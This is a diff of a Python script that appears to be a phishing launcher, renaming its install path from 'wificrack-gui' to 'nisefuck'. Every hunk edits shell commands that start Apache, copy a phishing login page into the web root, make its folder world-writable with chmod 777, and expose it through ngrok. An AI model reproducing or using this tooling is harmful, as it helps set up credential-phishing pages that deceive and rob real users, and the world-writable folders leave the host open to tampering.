@@ -14,7 +14,7 @@ if p == "y":
         os.system("sudo service apache2 start")
         oa = input("did you have phising file on /var/www/html y/n: ")
         if oa == "y":
-            os.system("sudo cp -r /opt/wificrack-gui/lib/web/login.php /var/www/html && cd /var/www/html && sudo rm -rf login && sudo mkdir login && sudo chmod 777 login && sudo mv login.php login && cd")
+            os.system("sudo cp -r /opt/nisefuck/lib/web/login.php /var/www/html && cd /var/www/html && sudo rm -rf login && sudo mkdir login && sudo chmod 777 login && sudo mv login.php login && cd")
             print("start ngrok..")
             sleep(5)
             i = input("what your name linux account: ")
@@ -52,7 +52,7 @@ if p == "y":
             else:
                 exit()
         elif oa == "n":
-            os.system("cd && sudo cp -r /opt/wificrack-gui/lib/web/login.php /var/www/html && cd /var/www/html && sudo mkdir login && sudo chmod 777 login && sudo mv login.php login && cd")
+            os.system("cd && sudo cp -r /opt/nisefuck/lib/web/login.php /var/www/html && cd /var/www/html && sudo mkdir login && sudo chmod 777 login && sudo mv login.php login && cd")
             print("start ngrok..")
             sleep(5)
             i = input("what your name linux account: ")
@@ -97,7 +97,7 @@ if p == "y":
         sleep(5)
         oa = input("did you have " + ps + " file on /var/www/html y/n: ")
         if oa == "y":
-            os.system("sudo cp -r /opt/wificeack-gui/lib/web/" + what + " /var/www/html && cd /var/www/html && sudo rm -rf " + ps + " && sudo mkdir " + ps +" && sudo chmod 777 "+ ps + " && sudo mv " + what + " " + ps + " && cd")
+            os.system("sudo cp -r /opt/nisefuck/lib/web/" + what + " /var/www/html && cd /var/www/html && sudo rm -rf " + ps + " && sudo mkdir " + ps +" && sudo chmod 777 "+ ps + " && sudo mv " + what + " " + ps + " && cd")
             print("start ngrok..")
             sleep(5)
             i = input("what your name linux account: ")
@@ -122,7 +122,7 @@ if p == "y":
             else:
                 exit()
         elif oa == "n":
-            os.system("sudo cp -r /opt/wificrack-gui/lib/web/"+ what +" /var/www/html && cd /var/www/html && sudo mkdir "+ ps +" && sudo chmod 777 "+ ps +" && sudo mv " + what + " "+ ps + " && cd")
+            os.system("sudo cp -r /opt/nisefuck/lib/web/"+ what +" /var/www/html && cd /var/www/html && sudo mkdir "+ ps +" && sudo chmod 777 "+ ps +" && sudo mv " + what + " "+ ps + " && cd")
             print("start ngrok..")
             sleep(5)
             print("start apache2...")
